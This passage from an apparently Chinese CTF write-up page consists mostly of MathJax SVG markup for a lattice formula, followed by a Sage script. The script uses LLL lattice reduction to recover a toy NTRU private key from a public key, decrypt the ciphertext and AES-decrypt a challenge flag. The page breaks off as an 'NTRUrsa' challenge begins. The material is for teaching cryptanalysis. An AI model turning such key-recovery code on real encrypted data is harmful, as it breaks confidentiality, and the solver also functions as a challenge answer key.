347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mrow" transform="translate(2384.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="5B" d="M247 -949V1450H516V1388H309V-887H516V-949H247Z"/></g><g data-mml-node="mtable" transform="translate(528,0)"><g data-mml-node="mtr" transform="translate(0,700)"><g data-mml-node="mtd"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mi" transform="translate(460,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g><g data-mml-node="mtd" transform="translate(1966,0)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g></g></g><g data-mml-node="mtr" transform="translate(0,-700)"><g data-mml-node="mtd" transform="translate(38,0)"><g data-mml-node="mi"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g></g><g data-mml-node="mtd" transform="translate(1964,0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></g><g data-mml-node="mo" transform="translate(2996,0) translate(0 -0.5)"><path data-c="5D" d="M11 1388V1450H280V-949H11V-887H218V1388H11Z"/></g></g><g data-mml-node="mtext" transform="translate(5908.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(6158.6,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"/></g><g data-mml-node="mi" transform="translate(6874.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mi" transform="translate(7450.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mi" transform="translate(7916.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(8367.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mtext" transform="translate(8833.6,0)"><path data-c="A0" d=""/></g><g data-mml-node="mi" transform="translate(9083.6,0)"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/></g><g data-mml-node="mo" transform="translate(9971.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mi" transform="translate(10249.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(10594.6,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g><g data-mml-node="mo" transform="translate(11150.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mo" transform="translate(12206.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="msup" transform="translate(12595.1,0)"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mi" transform="translate(609,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/></g></g><g data-mml-node="mo" transform="translate(13670.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msup" transform="translate(14171,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mi" transform="translate(605,413) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g><g data-mml-node="mo" transform="translate(15070,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(15459,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"/></g><g data-mml-node="mi" transform="translate(15903.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g><g data-mml-node="mi" transform="translate(16336.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/></g><g data-mml-node="mi" transform="translate(16821.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mi" transform="translate(17287.6,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(17837.6,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(18387.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(18732.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"/></g><g data-mml-node="mi" transform="translate(19165.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(19510.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g><g data-mml-node="mi" transform="translate(19976.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(20576.6,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/></g><g data-mml-node="mi" transform="translate(20937.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/></g><g data-mml-node="mo" transform="translate(21406.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(21795.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#sage</span><br><span class="line">import random</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">Zx.&lt;x&gt; = ZZ[]</span><br><span class="line"># R.&lt;x&gt; = ZZ[]</span><br><span class="line">def balancedmod(f,q):</span><br><span class="line">    g = list( ((f[i] + q//2) % q) - q//2 for i in range(n) )</span><br><span class="line">    return Zx(g)</span><br><span class="line"></span><br><span class="line">def cyclicconvolution(f, g):</span><br><span class="line">    return (f*g) % (x^n-1)</span><br><span class="line"></span><br><span class="line">def invertmodprime(f,p):</span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x^n-1)</span><br><span class="line">    return Zx(lift(1 / T(f)))</span><br><span class="line"></span><br><span class="line">def invertmodpowerof2(f,q):</span><br><span class="line">    assert q.is_power_of(2)</span><br><span class="line">    g = invertmodprime(f,2)</span><br><span class="line">    while True:</span><br><span class="line">        r = balancedmod(cyclicconvolution(g,f),q)</span><br><span class="line">        if r == 1: return g</span><br><span class="line">        g = balancedmod(cyclicconvolution(g,2 - r),q)</span><br><span class="line"></span><br><span class="line">def encrypt(message, publickey):</span><br><span class="line">    r = rpoly()</span><br><span class="line">    return balancedmod(cyclicconvolution(publickey, r) + message, q)</span><br><span class="line"></span><br><span class="line">def decrypt(cipher,f,fp):</span><br><span class="line">    # cipher=Zx(cipher)</span><br><span class="line">    a=balancedmod(cyclicconvolution(f, cipher), q)</span><br><span class="line">    m=balancedmod(cyclicconvolution(fp, a),p)</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">def attack(publickey):</span><br><span class="line">    recip3 = lift(1/Integers(q)(3))</span><br><span class="line">    publickeyover3 = balancedmod(recip3 * publickey,q)</span><br><span class="line">    M = matrix(2 * n)</span><br><span class="line">    for i in range(n):</span><br><span class="line">        M[i,i] = q</span><br><span class="line">    for i in range(n):</span><br><span class="line">        M[i+n,i+n] = 1</span><br><span class="line">        c = cyclicconvolution(x^i,publickeyover3)</span><br><span class="line">        for j in range(n):</span><br><span class="line">            M[i+n,j] = c[j]</span><br><span class="line">    M = M.LLL()</span><br><span class="line">    for j in range(2 * n):</span><br><span class="line">        try:</span><br><span class="line">            f = Zx(list(M[j][n:]))</span><br><span class="line">            f3 = invertmodprime(f,3)</span><br><span class="line">            return (f,f3)</span><br><span class="line">        except:pass</span><br><span class="line">    return (f,f)</span><br><span class="line"></span><br><span class="line">n = 10</span><br><span class="line">p = 3</span><br><span class="line">q = 512</span><br><span class="line">d = 3</span><br><span class="line">assert q&gt;(6*d+1)*p</span><br><span class="line"></span><br><span class="line">h = 39*x^9 + 60*x^8 + 349*x^7 + 268*x^6 + 144*x^5 + 469*x^4 + 449*x^3 + 165*x^2 + 248*x + 369</span><br><span class="line">e = -144*x^9 - 200*x^8 - 8*x^7 + 248*x^6 + 85*x^5 + 102*x^4 + 167*x^3 + 30*x^2 - 203*x - 78</span><br><span class="line">c = b'\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@}U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96="f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80'</span><br><span class="line"></span><br><span class="line"># publickey,secretkey = keypair()</span><br><span class="line">donald = attack(h.coefficients(sparse=False))</span><br><span class="line">m = decrypt(e,donald[0],donald[1])</span><br><span class="line"></span><br><span class="line">from Crypto.Hash import SHA3_256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">sha3 = SHA3_256.new()</span><br><span class="line">sha3.update(bytes(str(Zx(m)).encode('utf-8')))</span><br><span class="line">key = sha3.digest()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(c)</span><br><span class="line">print('c = %s' % flag)</span><br></pre></td></tr></table></figure><h2><span id="ntrursa">NTRUrsa</span></h2><h4><span id="题目">题目</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span 